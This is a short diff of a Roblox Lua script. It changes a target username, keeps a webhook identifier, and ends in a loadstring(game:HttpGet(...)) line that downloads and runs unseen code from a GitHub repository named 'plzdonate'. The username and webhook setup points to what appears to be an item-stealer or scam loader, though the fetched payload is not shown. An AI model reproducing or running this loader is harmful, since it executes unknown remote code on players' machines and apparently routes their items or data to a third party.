@@ -1,4 +1,4 @@
-Username = "newbeginner12345"
+Username = "1234newbeginner"
 Webhook = "e266f0cd-de4d-4f48-a0ca-4b636a595ff6"
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/sqwzy/plzdonate/refs/heads/main/main",true))() 
